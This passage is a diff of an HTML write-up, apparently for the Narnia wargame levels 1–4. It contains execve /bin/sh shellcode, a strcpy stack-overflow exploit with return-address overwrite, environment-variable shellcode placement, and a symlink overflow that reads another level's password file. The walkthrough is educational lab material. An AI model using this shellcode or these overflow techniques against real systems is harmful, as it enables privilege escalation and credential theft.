-push 0x68732f2f     ; pushes /sh <span class="o">(</span>//<span class="o">)</span>
-push 0x6e69622f     ; pushes /bin
-mov ebx, esp        ; passes the first argument
-push eax            ; empty third argument
-mov edx, esp        ; passes the third argument
-push eax            ; empty second argument
-mov ecx, esp        ; passes the second argument
-mov al, 11          ; execve system call <span class="c">#11</span>
-int 0x80            ; makes  an interrupt
+xor eax, eax ; make eax equal to 0
+push eax ; pushes null
+push 0x68732f2f ; pushes /sh <span class="o">(</span>//<span class="o">)</span>
+push 0x6e69622f ; pushes /bin
+mov ebx, esp ; passes the first argument
+push eax ; empty third argument
+mov edx, esp ; passes the third argument
+push eax ; empty second argument
+mov ecx, esp ; passes the second argument
+mov al, 11 ; execve system call <span class="c">#11</span>
+int 0x80 ; makes an interrupt
 </pre></div>
 
 
 <p>Compiling:</p>
 <div class="highlight"><pre>narnia1@melinda:/tmp<span class="nv">$ </span>nasm shellspawn.asm
 narnia1@melinda:/tmp<span class="nv">$ </span>ls
-shellspawn  shellspawn.asm
+shellspawn shellspawn.asm
 narnia1@melinda:/tmp<span class="nv">$ </span>cat shellspawn
 1�Ph//shh/bin��P��P���
 </pre></div>
@@ -519,8 +519,8 @@ narnia2
 <h3>Step 4: Convert it to Hexadecimal</h3>
 <p>It's really useful to have a hexadecimal form of our exploit (as we will see in the next levels) so we will use <code>xxd</code> to read it:</p>
 <div class="highlight"><pre>narnia5@melinda:/tmp<span class="nv">$ </span>xxd shellspawn
-0000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P
-0000010: 89e2 5089 e1b0 0bcd 80                   ..P......
+0000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350 1.Ph//shh/bin..P
+0000010: 89e2 5089 e1b0 0bcd 80 ..P......
 </pre></div>
 
 
@@ -545,62 +545,62 @@ narnia2
 <span class="cp">#include &lt;stdlib.h&gt;</span>
 
 <span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
-  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+ <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
 
-  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+ <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
+ <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+ <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+ <span class="p">}</span>
+ <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+ <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
 
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </pre></div>
 
 
-<p>This function copies an input string  to a <em>buf</em>, using <code>strcpy()</code> (instead of safer <code>strncpy()</code>).  Since there is no bounds checking,  <em>buf</em> overflows to the higher address  in the Stack if the input is larger than 128 bytes.</p>
-<p>In this problem we will use overflow to take control of the return address of the main function, which is right after <em>buf</em>. We will overwrite this to any address we want, for example to the address of a beautifully crafted exploit.</p>
+<p>This function copies an input string to a <em>buf</em>, using <code>strcpy()</code> (instead of safer <code>strncpy()</code>). Since there is no bounds checking, <em>buf</em> overflows to the higher address in the Stack if the input is larger than 128 bytes.</p>
+<p>In this problem, we will use overflow to take control of the return address of the main function, which is right after <em>buf</em>. We will overwrite this to any address we want, for example to the address of a beautifully crafted exploit.</p>
 <h3>Step 2: Finding the Frame Size</h3>
 <p>To find where the returning address of this function is located, we use <em>gdb</em>:</p>
 <div class="highlight"><pre>narnia2@melinda:/narnia<span class="nv">$ </span>gdb ./narnia2
 <span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
 <span class="o">(</span>gdb<span class="o">)</span> disas main
 Dump of assembler code <span class="k">for function </span>main:
-   0x08048424 &lt;+0&gt;: push   ebp
-   0x08048425 &lt;+1&gt;: mov    ebp,esp
-   0x08048427 &lt;+3&gt;: and    esp,0xfffffff0
-   0x0804842a &lt;+6&gt;: sub    esp,0x90
-   0x08048430 &lt;+12&gt;:  cmp    DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>,0x1
-   0x08048434 &lt;+16&gt;:  jne    0x8048458 &lt;main+52&gt;
-   0x08048436 &lt;+18&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-   0x08048439 &lt;+21&gt;:  mov    edx,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-   0x0804843b &lt;+23&gt;:  mov    eax,0x8048560
-   0x08048440 &lt;+28&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-   0x08048444 &lt;+32&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x08048447 &lt;+35&gt;:  call   0x8048320 &lt;<span class="nb">printf</span>@plt&gt;
-   0x0804844c &lt;+40&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
-   0x08048453 &lt;+47&gt;:  call   0x8048350 &lt;<span class="nb">exit</span>@plt&gt;
-   0x08048458 &lt;+52&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-   0x0804845b &lt;+55&gt;:  add    eax,0x4
-   0x0804845e &lt;+58&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-   0x08048460 &lt;+60&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
-   0x08048464 &lt;+64&gt;:  lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
-   0x08048468 &lt;+68&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x0804846b &lt;+71&gt;:  call   0x8048330 &lt;strcpy@plt&gt;
-   0x08048470 &lt;+76&gt;:  mov    eax,0x8048574
-   0x08048475 &lt;+81&gt;:  lea    edx,<span class="o">[</span>esp+0x10<span class="o">]</span>
-   0x08048479 &lt;+85&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-   0x0804847d &lt;+89&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x08048480 &lt;+92&gt;:  call   0x8048320 &lt;<span class="nb">printf</span>@plt&gt;
-   0x08048485 &lt;+97&gt;:  mov    eax,0x0
-   0x0804848a &lt;+102&gt;: leave
-   0x0804848b &lt;+103&gt;: ret
+ 0x08048424 &lt;+0&gt;: push ebp
+ 0x08048425 &lt;+1&gt;: mov ebp,esp
+ 0x08048427 &lt;+3&gt;: and esp,0xfffffff0
+ 0x0804842a &lt;+6&gt;: sub esp,0x90
+ 0x08048430 &lt;+12&gt;: cmp DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>,0x1
+ 0x08048434 &lt;+16&gt;: jne 0x8048458 &lt;main+52&gt;
+ 0x08048436 &lt;+18&gt;: mov eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+ 0x08048439 &lt;+21&gt;: mov edx,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+ 0x0804843b &lt;+23&gt;: mov eax,0x8048560
+ 0x08048440 &lt;+28&gt;: mov DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+ 0x08048444 &lt;+32&gt;: mov DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+ 0x08048447 &lt;+35&gt;: call 0x8048320 &lt;<span class="nb">printf</span>@plt&gt;
+ 0x0804844c &lt;+40&gt;: mov DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
+ 0x08048453 &lt;+47&gt;: call 0x8048350 &lt;<span class="nb">exit</span>@plt&gt;
+ 0x08048458 &lt;+52&gt;: mov eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+ 0x0804845b &lt;+55&gt;: add eax,0x4
+ 0x0804845e &lt;+58&gt;: mov eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+ 0x08048460 &lt;+60&gt;: mov DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+ 0x08048464 &lt;+64&gt;: lea eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+ 0x08048468 &lt;+68&gt;: mov DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+ 0x0804846b &lt;+71&gt;: call 0x8048330 &lt;strcpy@plt&gt;
+ 0x08048470 &lt;+76&gt;: mov eax,0x8048574
+ 0x08048475 &lt;+81&gt;: lea edx,<span class="o">[</span>esp+0x10<span class="o">]</span>
+ 0x08048479 &lt;+85&gt;: mov DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+ 0x0804847d &lt;+89&gt;: mov DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+ 0x08048480 &lt;+92&gt;: call 0x8048320 &lt;<span class="nb">printf</span>@plt&gt;
+ 0x08048485 &lt;+97&gt;: mov eax,0x0
+ 0x0804848a &lt;+102&gt;: leave
+ 0x0804848b &lt;+103&gt;: ret
 End of assembler dump.
 </pre></div>
 
 
-<p>We create a break point right before the exit:</p>
+<p>We create a breakpoint right before the exit:</p>
 <div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span> <span class="o">*</span><span class="n">main</span><span class="o">+</span><span class="mi">97</span>
 <span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048485</span>
 </pre></div>
@@ -608,26 +608,26 @@ End of assembler dump.
 
 <p>We run our program, feeding it with an argument of size 30 and we look to the memory (esp is the Stack pointer). The second value, <strong>0xffffd610</strong>, indicates the start of the frame:</p>
 <div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="mi">30</span><span class="err">&#39;`</span>
-<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>  <span class="n">x</span><span class="o">/</span><span class="mi">30</span><span class="n">xw</span> <span class="err">$</span><span class="n">esp</span>
-<span class="mh">0xffffd600</span><span class="o">:</span> <span class="mh">0x08048574</span>  <span class="mh">0xffffd610</span>  <span class="mh">0x00000001</span>  <span class="mh">0xf7ebf729</span>
-<span class="mh">0xffffd610</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
-<span class="mh">0xffffd620</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0xf7004242</span>
-<span class="mh">0xffffd630</span><span class="o">:</span> <span class="mh">0x08048258</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00ca0000</span>  <span class="mh">0x00000001</span>
-<span class="mh">0xffffd640</span><span class="o">:</span> <span class="mh">0xffffd86d</span>  <span class="mh">0x0000002f</span>  <span class="mh">0xffffd69c</span>  <span class="mh">0xf7fcaff4</span>
-<span class="mh">0xffffd650</span><span class="o">:</span> <span class="mh">0x08048490</span>  <span class="mh">0x08049750</span>  <span class="mh">0x00000002</span>  <span class="mh">0x080482fd</span>
-<span class="mh">0xffffd660</span><span class="o">:</span> <span class="mh">0xf7fcb3e4</span>  <span class="mh">0x00008000</span>  <span class="mh">0x08049750</span>  <span class="mh">0x080484b1</span>
-<span class="mh">0xffffd670</span><span class="o">:</span> <span class="mh">0xffffffff</span>  <span class="mh">0xf7e59d46</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">30</span><span class="n">xw</span> <span class="err">$</span><span class="n">esp</span>
+<span class="mh">0xffffd600</span><span class="o">:</span> <span class="mh">0x08048574</span> <span class="mh">0xffffd610</span> <span class="mh">0x00000001</span> <span class="mh">0xf7ebf729</span>
+<span class="mh">0xffffd610</span><span class="o">:</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span>
+<span class="mh">0xffffd620</span><span class="o">:</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span> <span class="mh">0xf7004242</span>
+<span class="mh">0xffffd630</span><span class="o">:</span> <span class="mh">0x08048258</span> <span class="mh">0x00000000</span> <span class="mh">0x00ca0000</span> <span class="mh">0x00000001</span>
+<span class="mh">0xffffd640</span><span class="o">:</span> <span class="mh">0xffffd86d</span> <span class="mh">0x0000002f</span> <span class="mh">0xffffd69c</span> <span class="mh">0xf7fcaff4</span>
+<span class="mh">0xffffd650</span><span class="o">:</span> <span class="mh">0x08048490</span> <span class="mh">0x08049750</span> <span class="mh">0x00000002</span> <span class="mh">0x080482fd</span>
+<span class="mh">0xffffd660</span><span class="o">:</span> <span class="mh">0xf7fcb3e4</span> <span class="mh">0x00008000</span> <span class="mh">0x08049750</span> <span class="mh">0x080484b1</span>
+<span class="mh">0xffffd670</span><span class="o">:</span> <span class="mh">0xffffffff</span> <span class="mh">0xf7e59d46</span>
 </pre></div>
 
 
-<p>Now, looking  to the information about the frame, we get the return address at <strong>0xffffd69c</strong>:</p>
+<p>Now, looking to the information about the frame, we get the return address at <strong>0xffffd69c</strong>:</p>
 <div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">f</span>
 <span class="n">Stack</span> <span class="n">level</span> <span class="mi">0</span><span class="p">,</span> <span class="n">frame</span> <span class="n">at</span> <span class="mh">0xffffd6a0</span><span class="o">:</span>
  <span class="n">eip</span> <span class="o">=</span> <span class="mh">0x8048485</span> <span class="n">in</span> <span class="n">main</span><span class="p">;</span> <span class="n">saved</span> <span class="n">eip</span> <span class="mh">0xf7e404b3</span>
  <span class="n">Arglist</span> <span class="n">at</span> <span class="mh">0xffffd698</span><span class="p">,</span> <span class="n">args</span><span class="o">:</span>
  <span class="n">Locals</span> <span class="n">at</span> <span class="mh">0xffffd698</span><span class="p">,</span> <span class="n">Previous</span> <span class="n">frame</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">sp</span> <span class="n">is</span> <span class="mh">0xffffd6a0</span>
  <span class="n">Saved</span> <span class="n">registers</span><span class="o">:</span>
-  <span class="n">ebp</span> <span class="n">at</span> <span class="mh">0xffffd698</span><span class="p">,</span> <span class="n">eip</span> <span class="n">at</span> <span class="mh">0xffffd69c</span>
+ <span class="n">ebp</span> <span class="n">at</span> <span class="mh">0xffffd698</span><span class="p">,</span> <span class="n">eip</span> <span class="n">at</span> <span class="mh">0xffffd69c</span>
 </pre></div>
 
 
@@ -639,7 +639,7 @@ End of assembler dump.
 
 <p>So we know that 140 bytes are needed to reach the return address, where we will add our pointer.</p>
 <h3>Step 3: Finding the EGG ShellCode Address</h3>
-<p>Where do we want to point the return address to? Well, we already know  a way to spawn a shell: using an environment variable:</p>
+<p>Where do we want to point the return address to? Well, we already know a way to spawn a shell: using an environment variable:</p>
 <div class="highlight"><pre>narnia2@melinda:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">EGG</span><span class="o">=</span><span class="sb">`</span>python -c<span class="s1">&#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&quot;&#39;</span>
 </pre></div>
 
@@ -651,11 +651,11 @@ End of assembler dump.
 <span class="cp">#include &lt;string.h&gt;</span>
 
 <span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
-        <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
-        <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-        <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s is at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">ptr</span><span class="p">);</span>
-        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+ <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+ <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
+ <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s is at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">ptr</span><span class="p">);</span>
+ <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </pre></div>
 
@@ -667,7 +667,7 @@ End of assembler dump.
 
 
 <h3>Step 4: Running the Exploit!</h3>
-<p>Now all we need to do is to run the binary with 140 bytes of junk plus the address that we want to point  the return address to:</p>
+<p>Now all we need to do is to run the binary with 140 bytes of junk plus the address that we want to point the return address to:</p>
 <div class="highlight"><pre>narnia2@melinda:/tmp/ya2<span class="nv">$ </span>/narnia/narnia2 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;A&quot;*140 + &quot;\x45\xd9\xff\xff&quot;&#39;</span><span class="sb">`</span>
 <span class="nv">$ </span>whoami
 narnia3
@@ -691,37 +691,37 @@ narnia3@melinda:/narnia<span class="nv">$ </span>cat narnia3.c
 
 int main<span class="o">(</span>int argc, char **argv<span class="o">){</span>
 
-        int  ifd,  ofd;
-        char ofile<span class="o">[</span>16<span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;/dev/null&quot;</span>;
-        char ifile<span class="o">[</span>32<span class="o">]</span>;
-        char buf<span class="o">[</span>32<span class="o">]</span>;
+ int ifd, ofd;
+ char ofile<span class="o">[</span>16<span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;/dev/null&quot;</span>;
+ char ifile<span class="o">[</span>32<span class="o">]</span>;
+ char buf<span class="o">[</span>32<span class="o">]</span>;
 
-        <span class="k">if</span><span class="o">(</span>argc !<span class="o">=</span> 2<span class="o">){</span>
-                <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;usage, %s file, will send contents of file 2 /dev/null\n&quot;</span>,argv<span class="o">[</span>0<span class="o">])</span>;
-                <span class="nb">exit</span><span class="o">(</span>-1<span class="o">)</span>;
-        <span class="o">}</span>
+ <span class="k">if</span><span class="o">(</span>argc !<span class="o">=</span> 2<span class="o">){</span>
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;usage, %s file, will send contents of file 2 /dev/null\n&quot;</span>,argv<span class="o">[</span>0<span class="o">])</span>;
+ <span class="nb">exit</span><span class="o">(</span>-1<span class="o">)</span>;
+ <span class="o">}</span>
 
-        /* open files */
-        strcpy<span class="o">(</span>ifile, argv<span class="o">[</span>1<span class="o">])</span>;
-        <span class="k">if</span><span class="o">((</span><span class="nv">ofd</span> <span class="o">=</span> open<span class="o">(</span>ofile,O_RDWR<span class="o">))</span> &lt; 0 <span class="o">){</span>
-                <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;error opening %s\n&quot;</span>, ofile<span class="o">)</span>;
-                <span class="nb">exit</span><span class="o">(</span>-1<span class="o">)</span>;
-        <span class="o">}</span>
-        <span class="k">if</span><span class="o">((</span><span class="nv">ifd</span> <span class="o">=</span> open<span class="o">(</span>ifile, O_RDONLY<span class="o">))</span> &lt; 0 <span class="o">){</span>
-                <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;error opening %s\n&quot;</span>, ifile<span class="o">)</span>;
-                <span class="nb">exit</span><span class="o">(</span>-1<span class="o">)</span>;
-        <span class="o">}</span>
+ /* open files */
+ strcpy<span class="o">(</span>ifile, argv<span class="o">[</span>1<span class="o">])</span>;
+ <span class="k">if</span><span class="o">((</span><span class="nv">ofd</span> <span class="o">=</span> open<span class="o">(</span>ofile,O_RDWR<span class="o">))</span> &lt; 0 <span class="o">){</span>
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;error opening %s\n&quot;</span>, ofile<span class="o">)</span>;
+ <span class="nb">exit</span><span class="o">(</span>-1<span class="o">)</span>;
+ <span class="o">}</span>
+ <span class="k">if</span><span class="o">((</span><span class="nv">ifd</span> <span class="o">=</span> open<span class="o">(</span>ifile, O_RDONLY<span class="o">))</span> &lt; 0 <span class="o">){</span>
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;error opening %s\n&quot;</span>, ifile<span class="o">)</span>;
+ <span class="nb">exit</span><span class="o">(</span>-1<span class="o">)</span>;
+ <span class="o">}</span>
 
-        /* copy from file1 to file2 */
-        <span class="nb">read</span><span class="o">(</span>ifd, buf, sizeof<span class="o">(</span>buf<span class="o">)</span>-1<span class="o">)</span>;
-        write<span class="o">(</span>ofd,buf, sizeof<span class="o">(</span>buf<span class="o">)</span>-1<span class="o">)</span>;
-        <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;copied contents of %s to a safer place... (%s)\n&quot;</span>,ifile,ofile<span class="o">)</span>;
+ /* copy from file1 to file2 */
+ <span class="nb">read</span><span class="o">(</span>ifd, buf, sizeof<span class="o">(</span>buf<span class="o">)</span>-1<span class="o">)</span>;
+ write<span class="o">(</span>ofd,buf, sizeof<span class="o">(</span>buf<span class="o">)</span>-1<span class="o">)</span>;
+ <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;copied contents of %s to a safer place... (%s)\n&quot;</span>,ifile,ofile<span class="o">)</span>;
 
-        /* close <span class="err">&#39;</span>em */
-        close<span class="o">(</span>ifd<span class="o">)</span>;
-        close<span class="o">(</span>ofd<span class="o">)</span>;
+ /* close <span class="err">&#39;</span>em */
+ close<span class="o">(</span>ifd<span class="o">)</span>;
+ close<span class="o">(</span>ofd<span class="o">)</span>;
 
-        <span class="nb">exit</span><span class="o">(</span>1<span class="o">)</span>;
+ <span class="nb">exit</span><span class="o">(</span>1<span class="o">)</span>;
 <span class="o">}</span>
 </pre></div>
 
@@ -758,14 +758,14 @@ int main<span class="o">(</span>int argc, char **argv<span class="o">){</span>
 </pre></div>
 
 
-<p>The previous example showed the first byte after overflowing <em>ifile</em>. This last example ends in the last possible byte in the array. Once we overflow <em>ifile</em>, it skips  the checking, going straight to check whether <em>ofile</em> is a valid name. Awesome!</p>
+<p>The previous example showed the first byte after overflowing <em>ifile</em>. This last example ends in the last possible byte in the array. Once we overflow <em>ifile</em>, it skips the checking, going straight to check whether <em>ofile</em> is a valid name. Awesome!</p>
 <h3>Step 3: Writing and Applying the Exploit</h3>
 <p>We want two things happening in <em>ifile</em>: first, to read the password file, then to overflows <em>ofile</em>, making it point to a file we have access to read.</p>
 <p>The best way to put all of this in one input name is by creating a symbolic link with the following rules:</p>
 <ol>
 <li>Point to <em>/etc/narnia_pass/narnia4</em>.</li>
 <li>Fill the 32 bytes of the <em>ifile</em> array with junk.</li>
-<li>End with some file name which we  had created before, and we have permission to read (we can just use <code>touch</code> to create an empty file).</li>
+<li>End with some file name which we had created before, and we have permission to read (we can just use <code>touch</code> to create an empty file).</li>
 </ol>
 <p>The result, for a file name <em>out</em>, is:</p>
 <div class="highlight"><pre><span class="nv">$ </span>ln -s /etc/narnia_pass/narnia4 <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;A&#39;*32 + &#39;out&#39;&quot;</span><span class="k">)</span>
@@ -781,7 +781,7 @@ narnia3@melinda:/tmp<span class="nv">$ </span>cat out
 <hr />
 <h2>Level 4: Classic Buffer Overflow with NOP</h2>
 <h3>Step 1: Understanding the Problem</h3>
-<p>This  fifth level starts with:</p>
+<p>This fifth level starts with:</p>
 <div class="highlight"><pre>narnia4@melinda:/narnia<span class="nv">$ </span>./narnia4
 narnia4@melinda:/narnia<span class="nv">$ </span>cat narnia4.c
 
@@ -793,49 +793,49 @@ narnia4@melinda:/narnia<span class="nv">$ </span>cat narnia4.c
 extern char **environ;
 
 int main<span class="o">(</span>int argc,char **argv<span class="o">){</span>
-  int i;
-  char buffer<span class="o">[</span>256<span class="o">]</span>;
+ int i;
+ char buffer<span class="o">[</span>256<span class="o">]</span>;
 
-  <span class="k">for</span><span class="o">(</span><span class="nv">i</span> <span class="o">=</span> 0; environ<span class="o">[</span>i<span class="o">]</span> !<span class="o">=</span> NULL; i++<span class="o">)</span>
-    memset<span class="o">(</span>environ<span class="o">[</span>i<span class="o">]</span>, <span class="s1">&#39;\0&#39;</span>, strlen<span class="o">(</span>environ<span class="o">[</span>i<span class="o">]))</span>;
+ <span class="k">for</span><span class="o">(</span><span class="nv">i</span> <span class="o">=</span> 0; environ<span class="o">[</span>i<span class="o">]</span> !<span class="o">=</span> NULL; i++<span class="o">)</span>
+ memset<span class="o">(</span>environ<span class="o">[</span>i<span class="o">]</span>, <span class="s1">&#39;\0&#39;</span>, strlen<span class="o">(</span>environ<span class="o">[</span>i<span class="o">]))</span>;
 
-  <span class="k">if</span><span class="o">(</span>argc&gt;1<span class="o">)</span>
-    strcpy<span class="o">(</span>buffer,argv<span class="o">[</span>1<span class="o">])</span>;
+ <span class="k">if</span><span class="o">(</span>argc&gt;1<span class="o">)</span>
+ strcpy<span class="o">(</span>buffer,argv<span class="o">[</span>1<span class="o">])</span>;
 
-  <span class="k">return </span>0;
+ <span class="k">return </span>0;
 <span class="o">}</span>
 </pre></div>
 
 
 <p>This binary does three things: first, it creates a buffer array of size 256, then it makes all of the system environment variables equal to zero, and then it copies whatever user input it had to the buffer.</p>
-<p>The reason why this code clears  the environment variables is to avoid the possibility of us placing a shellcode exploit to them  (like we did in Level 2).</p>
+<p>The reason why this code clears the environment variables is to avoid the possibility of us placing a shellcode exploit to them (like we did in Level 2).</p>
 <h3>Step 2: Outlining the Attack</h3>
-<p>To exploit this binary we are going to overwrite our <strong>return address</strong> like in  level 2, but this time we can't use an external address to point to. However, since our Stack is executable, we can place the shellcode in the Stack. The steps we follow are:</p>
+<p>To exploit this binary we are going to overwrite our <strong>return address</strong> like in level 2, but this time we can't use an external address to point to. However, since our Stack is executable, we can place the shellcode in the Stack. The steps we follow are:</p>
 <ol>
-<li>Find out the size of the Stack.  Just having the return address won't help  since we can't point it to anywhere outside the code.</li>
+<li>Find out the size of the Stack. Just having the return address won't help since we can't point it to anywhere outside the code.</li>
 <li>Create a shellcode with the return address minus some value we define so that the return address points to somewhere inside the Stack.</li>
 <li>Fill the beginning of the Stack with lots of <a href="http://en.wikipedia.org/wiki/NOP">NOPs</a> (No Operations, used to pad/align bytes or to delay time), which in the x86 CPU family is represented with <code>0x90</code>. If the pointer hits these places, it just keeps advancing until it finds our shell.</li>
-<li>To make everything fit right in the Stack frame, we pad the end of the shell code with junk.
+<li>To make everything fit right in the Stack frame, we pad the end of the shellcode with junk.
 .</li>
 </ol>
 <h3>Step 3: Getting the Frame Size</h3>
 <p>With gdb we can extract the relevant memory locations. Let's run our program with an input of the size of the buffer. Here we use the flag <code>--args</code> because otherwise we will get an error that the name is too long:</p>
-<div class="highlight"><pre>narnia4@melinda:/narnia<span class="nv">$ </span>gdb --args  narnia4 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;A&#39;*256&quot;</span><span class="sb">`</span>
+<div class="highlight"><pre>narnia4@melinda:/narnia<span class="nv">$ </span>gdb --args narnia4 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;A&#39;*256&quot;</span><span class="sb">`</span>
